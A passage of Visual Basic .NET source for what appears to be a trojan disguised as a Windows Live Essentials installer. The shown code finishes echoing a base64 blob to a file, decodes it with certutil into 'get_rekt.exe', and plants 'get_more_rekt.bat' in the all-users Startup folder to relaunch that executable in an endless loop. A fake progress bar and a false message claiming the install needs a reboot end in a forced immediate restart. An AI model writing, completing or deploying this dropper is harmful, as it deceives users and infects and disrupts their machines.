"echo LAESDAcGFRIsARIIBwYVEiwBEmkHBhUSLAESJAcGFRIsARIoBAYSgJEEBhKAlQMGEhgCBgICBhwE" + vbCrLf + "echo BhKApQQGEoC1AwYSdQMGEiAFAAEBHQ4DAAABBAAAEgwEAAASCAQAABJpBAAAEiQEAAASKAUAABKA" + vbCrLf + "echo kQUAABKAlQYAAQESgJUHAAIBHBKAnQQAABIYByACARwSgJ0FIAASgLUGIAEBEoC1BxABAR4AHgAH" + vbCrLf + "echo MAEBARAeAAUgABKAgQQgABIgBSABARIgBAgAEgwECAASCAQIABJpBAgAEiQECAASKAUIABKAkQUI" + vbCrLf + "echo ABKAlQQIABIYBSgAEoC1BCgAEiAEKAATAAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlv" + vbCrLf + "echo blRocm93cwEIAQAHAQAAAAANAQAIZ2V0X3Jla3QAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIw" + vbCrLf + "echo MTkAACkBACQxOTY3MGE5OC03YTM4LTQ0MDAtOTY3Yy03YjU5N2ZlMDhjYTYAAAwBAAcxLjAuMC4w" + vbCrLf + "echo AABNAQAcLk5FVEZyYW1ld29yayxWZXJzaW9uPXY0LjcuMgEAVA4URnJhbWV3b3JrRGlzcGxheU5h" + vbCrLf + "echo bWUULk5FVCBGcmFtZXdvcmsgNC43LjIEAQAAAAgBAAIAAAAAAAgBAAEAAAAAAAgBAAAAAAAAAAsB" + vbCrLf + "echo AAZMYWJlbDEAABgBAApNeVRlbXBsYXRlCDExLjAuMC4wAABAAQAzU3lzdGVtLlJlc291cmNlcy5U" + vbCrLf + "echo b29scy5TdHJvbmdseVR5cGVkUmVzb3VyY2VCdWlsZGVyBzQuMC4wLjAAAFkBAEtNaWNyb3NvZnQu" + vbCrLf + "echo VmlzdWFsU3R1ZGlvLkVkaXRvcnMuU2V0dGluZ3NEZXNpZ25lci5TZXR0aW5nc1NpbmdsZUZpbGVH" + vbCrLf + "echo ZW5lcmF0b3IIMTEuMC4wLjAAAFgBABlTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Gb3JtEkNyZWF0ZV9f" + vbCrLf + "echo SW5zdGFuY2VfXxNEaXNwb3NlX19JbnN0YW5jZV9fEk15Lk15UHJvamVjdC5Gb3JtcwAAYQEANFN5" + vbCrLf + "echo c3RlbS5XZWIuU2VydmljZXMuUHJvdG9jb2xzLlNvYXBIdHRwQ2xpZW50UHJvdG9jb2wSQ3JlYXRl" + vbCrLf + "echo X19JbnN0YW5jZV9fE0Rpc3Bvc2VfX0luc3RhbmNlX18AAAAQAQALTXkuQ29tcHV0ZXIAABMBAA5N" + vbCrLf + "echo eS5BcHBsaWNhdGlvbgAADAEAB015LlVzZXIAAA0BAAhNeS5Gb3JtcwAAEwEADk15LldlYlNlcnZp" + vbCrLf + "echo Y2VzAAAQAQALTXkuU2V0dGluZ3MAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5S" + vbCrLf + "echo ZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFs" + vbCrLf + "echo LCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5I1N5c3RlbS5SZXNvdXJjZXMuUnVudGlt" + vbCrLf + "echo ZVJlc291cmNlU2V0AgAAAAAAAAAAAAAAUEFEUEFEULQAAAC0AAAAzsrvvgEAAACRAAAAbFN5c3Rl" + vbCrLf + "echo bS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1" + vbCrLf + "echo bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVz" + vbCrLf + "echo b3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAAAAAAAAAAAAFBBRFBBRFC0AAAAAAAAANCebaMA" + vbCrLf + "echo AAAAAgAAAHMAAADwSgAA8CwAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RT2Cpec6TG" + vbCrLf + "echo jE2lISlg2IQq9AEAAABEOlxQcm9ncmFtbWluZyBQcm9qZWN0c1xWaXN1YWwgQmFzaWMgUHJvamVj" + vbCrLf + "echo dHNcbG9sXGdldF9yZWt0XGdldF9yZWt0XG9ialxEZWJ1Z1xnZXRfcmVrdC5wZGIAi0sAAAAAAAAA" + vbCrLf + "echo AAAApUsAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJdLAAAAAAAAAAAAAAAAX0NvckV4ZU1haW4A" + vbCrLf + "echo bXNjb3JlZS5kbGwAAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAA" + vbCrLf + "echo gBgAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAACsAwAAkGAAABwDAAAA" + vbCrLf + "echo AAAAAAAAABwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAA" + vbCrLf + "echo AQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBp" + vbCrLf + "echo AGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAR8AgAA" + vbCrLf + "echo AQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAABYAgAAAQAwADAAMAAwADAANABiADAAAAAa" + vbCrLf + "echo AAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAA" + vbCrLf + "echo AAAAAAAAOgAJAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAGcAZQB0AF8AcgBl" + vbCrLf + "echo AGsAdAAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAA" + vbCrLf + "echo OgANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABnAGUAdABfAHIAZQBrAHQALgBlAHgAZQAA" + vbCrLf + "echo AAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQA" + vbCrLf + "echo IACpACAAIAAyADAAMQA5AAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAA" + vbCrLf + "echo AAAAAABCAA0AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAZwBlAHQAXwByAGUA" + vbCrLf + "echo awB0AC4AZQB4AGUAAAAAADIACQABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAZwBlAHQAXwBy" + vbCrLf + "echo AGUAawB0AAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAA" + vbCrLf + "echo LgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAu" + vbCrLf + "echo ADAAAAC8YwAA6gEAAAAAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRG" + vbCrLf + "echo LTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KDQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1p" + vbCrLf + "echo Y3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlk" + vbCrLf + "echo ZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0" + vbCrLf + "echo cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8" + vbCrLf + "echo c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMt" + vbCrLf + "echo bWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwg" + vbCrLf + "echo bGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFBy" + vbCrLf + "echo aXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5PgAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAMAAAAuDsAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + vbCrLf + "echo -----END CERTIFICATE-----" + vbCrLf + "echo" + vbCrLf + ") >>%cd%\_get_rekt.exe_.b64" + vbCrLf + "certutil -decode %cd%\_get_rekt.exe_.b64 %cd%\get_rekt.exe" + vbCrLf + "del %cd%\*_.b64")
        IO.File.WriteAllText("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\get_more_rekt.bat", "@echo off" + vbCrLf + ":1" + vbCrLf + "get_rekt.exe" + vbCrLf + "goto :1")
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Value += 1
        If ProgressBar1.Value = 100 Then
            Timer1.Stop()
            MsgBox("Complete! Now, it's required that you reboot your system, otherwise Live Essentials won't be installed correctly. Pressing OK will reboot your system, so make sure to save any your work and close every program running.", MsgBoxStyle.OkOnly + MsgBoxStyle.Information, "Final step")
            If MsgBoxResult.Ok Then
                Shell("shutdown -r /t 0 -c ""good luck boi""")
            End If
        End If
    End Sub
End Class